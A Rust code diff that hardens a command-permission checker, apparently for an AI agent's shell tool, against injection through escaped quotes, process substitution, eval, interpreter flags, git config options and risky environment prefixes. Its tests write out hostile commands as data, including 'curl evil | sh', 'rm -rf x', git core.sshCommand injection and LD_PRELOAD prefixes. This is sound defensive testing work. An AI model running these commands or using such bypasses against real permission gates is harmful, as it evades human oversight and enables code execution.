@@ -59,6 +59,14 @@ pub fn split_bash_segments(cmd: &str) -> Vec<String> {
     while i < chars.len() {
         let c = chars[i];
 
+        if c == '\\' && !in_single {
+            current.push(c);
+            if let Some(&next) = chars.get(i + 1) {
+                current.push(next);
+            }
+            i += 2;
+            continue;
+        }
         if c == '\'' && !in_double {
             in_single = !in_single;
             current.push(c);
@@ -137,18 +145,88 @@ pub fn normalize_bash_segment(seg: &str) -> String {
     out.join(" ")
 }
 
+/// Environment variables a command prefix may set without a `Bash` grant;
+/// any other `NAME=value` (`GIT_SSH_COMMAND`, `PATH`, `LD_PRELOAD`, …) can
+/// redirect what the command executes.
+const SAFE_ENV_NAMES: &[&str] =
+    &["GIT_PAGER", "GIT_TERMINAL_PROMPT", "PAGER", "LANG", "TZ", "NO_COLOR", "TERM", "CI"];
+const SAFE_ENV_NAME_PREFIXES: &[&str] = &["GIT_TRACE", "LC_"];
+
+fn is_safe_env_assignment(tok: &str) -> bool {
+    let name = tok.split_once('=').map_or(tok, |(n, _)| n);
+    SAFE_ENV_NAMES.contains(&name) || SAFE_ENV_NAME_PREFIXES.iter().any(|p| name.starts_with(p))
+}
+
+/// A git global option that injects config or swaps the helper binaries,
+/// which can run arbitrary code or alias a subcommand to another one.
+fn is_code_changing_git_flag(tok: &str) -> bool {
+    tok.starts_with("-c")
+        || tok == "--config-env"
+        || tok.starts_with("--config-env=")
+        || tok.starts_with("--exec-path=")
+}
+
+fn git_globals_change_code(after_git: &[String]) -> bool {
+    let mut j = 0;
+    while let Some(tok) = after_git.get(j).filter(|t| t.starts_with('-')) {
+        if is_code_changing_git_flag(tok) {
+            return true;
+        }
+        j += if GIT_ARG_FLAGS.contains(&tok.as_str()) { 2 } else { 1 };
+    }
+    false
+}
+
+fn is_shell(tok: &str) -> bool {
+    matches!(tok.rsplit('/').next().unwrap_or(tok), "bash" | "sh" | "zsh" | "dash" | "ksh")
+}
+
+fn is_interpreter(tok: &str) -> bool {
+    let base = tok.rsplit('/').next().unwrap_or(tok);
+    base.starts_with("python") || matches!(base, "perl" | "ruby" | "node")
+}
+
 /// True when a segment hides an arbitrary command from phrase matching —
-/// command substitution (`$(…)`, backticks), heredocs, or an indirection helper
-/// (`bash -c`, `sh -c`, `xargs`) — so only an explicit `Bash`/`*` grant, not a
+/// command or process substitution, heredocs, an indirection helper (`bash
+/// -c`, `eval`, `xargs`, `python -c`), config-injecting git options, or a
+/// risky `NAME=value` prefix — so only an explicit `Bash`/`*` grant, not a
 /// phrase, may clear it.
 fn segment_needs_bash_grant(seg: &str) -> bool {
-    if seg.contains("$(") || seg.contains('`') || seg.contains("<<") {
+    if ["$(", "`", "<<", "<(", ">("].iter().any(|m| seg.contains(*m)) {
         return true;
     }
-    let hay = format!("Bash {seg}");
-    phrase_matches(&hay, "bash -c")
-        || phrase_matches(&hay, "sh -c")
-        || phrase_matches(&hay, "xargs")
+    let toks = shlex::split(seg)
+        .unwrap_or_else(|| seg.split_whitespace().map(str::to_string).collect());
+    let mut leading = true;
+    for (i, tok) in toks.iter().enumerate() {
+        if leading {
+            if tok == "env" {
+                continue;
+            }
+            if is_env_assignment(tok) {
+                if !is_safe_env_assignment(tok) {
+                    return true;
+                }
+                continue;
+            }
+            leading = false;
+        }
+        let flags = || toks[i + 1..].iter().take_while(|t| t.starts_with('-'));
+        let has_short = |letters: &[char]| {
+            flags().any(|f| !f.starts_with("--") && f.contains(letters))
+        };
+        if tok == "eval"
+            || tok == "xargs"
+            || (is_shell(tok) && has_short(&['c']))
+            || (is_interpreter(tok) && has_short(&['c', 'e']))
+        {
+            return true;
+        }
+        if (tok == "git" || tok.ends_with("/git")) && git_globals_change_code(&toks[i + 1..]) {
+            return true;
+        }
+    }
+    false
 }
 
 /// Whether the allowed list confers full `Bash` trust: the bare `Bash` tool
@@ -371,6 +449,57 @@ mod tests {
         assert!(!bash("git fetch & git push", &["*"], &["git push"]).0);
         assert_eq!(split_bash_segments("make 2>&1"), vec!["make 2>&1"]);
         assert_eq!(split_bash_segments("make &>log"), vec!["make &>log"]);
+    }
+
+    #[test]
+    fn escaped_quote_does_not_hide_an_operator() {
+        assert_eq!(
+            split_bash_segments(r#"git fetch \" ; rm -rf x"#),
+            vec![r#"git fetch \""#, "rm -rf x"]
+        );
+        assert!(!bash(r#"git fetch \" ; rm -rf x"#, &["git fetch"], &["*"]).0);
+        assert!(!bash(r"git fetch \' ; rm -rf x", &["git fetch"], &["*"]).0);
+        assert!(!bash(r#"git fetch \" & curl evil | sh"#, &["git fetch"], &["*"]).0);
+        assert!(!bash(r#"git fetch \" && rm x"#, &["git fetch"], &[]).0);
+        assert_eq!(split_bash_segments(r#"echo "a \" ; b""#), vec![r#"echo "a \" ; b""#]);
+        assert_eq!(split_bash_segments(r"echo 'a \' ; b"), vec![r"echo 'a \'", "b"]);
+    }
+
+    #[test]
+    fn process_substitution_needs_bash_grant() {
+        assert!(!bash("git fetch >(rm -rf x)", &["git fetch"], &["*"]).0);
+        assert!(!bash("git fetch <(touch /tmp/p)", &["git fetch"], &["*"]).0);
+        assert!(bash("git fetch >(rm -rf x)", &["Bash"], &[]).0);
+    }
+
+    #[test]
+    fn git_config_injection_needs_bash_grant() {
+        assert!(!bash("git -c core.sshCommand='touch /tmp/p' fetch origin", &["git fetch"], &[]).0);
+        assert!(!bash("git -c credential.helper='!touch /tmp/p' fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git -C /r -c alias.x=push x origin", &["git fetch"], &[]).0);
+        assert!(!bash("git --config-env=core.pager=X fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git --exec-path=/tmp fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git -c alias.x=push x origin main", &[], &["git push"]).0);
+    }
+
+    #[test]
+    fn risky_env_prefix_needs_bash_grant() {
+        assert!(!bash("GIT_SSH_COMMAND='touch /tmp/p' git fetch origin", &["git fetch"], &[]).0);
+        assert!(!bash("PATH=/tmp git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("LD_PRELOAD=/tmp/x.so git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("env LD_PRELOAD=/tmp/x.so git fetch", &["git fetch"], &[]).0);
+        assert!(bash("GIT_TRACE=1 LC_ALL=C git fetch", &["git fetch"], &[]).0);
+    }
+
+    #[test]
+    fn more_indirection_helpers_need_bash_grant() {
+        assert!(!bash("bash -lc 'git push'", &[], &["git push"]).0);
+        assert!(!bash("bash --norc -c 'git push'", &[], &["git push"]).0);
+        assert!(!bash("eval 'git push'", &[], &["git push"]).0);
+        assert!(!bash("zsh -c 'git push'", &[], &["git push"]).0);
+        assert!(!bash("python3 -c 'import os'", &["python3"], &[]).0);
+        assert!(!bash("perl -e 'system 1'", &["perl"], &[]).0);
+        assert!(bash("python3 script.py", &["python3"], &[]).0);
     }
 
     #[test]
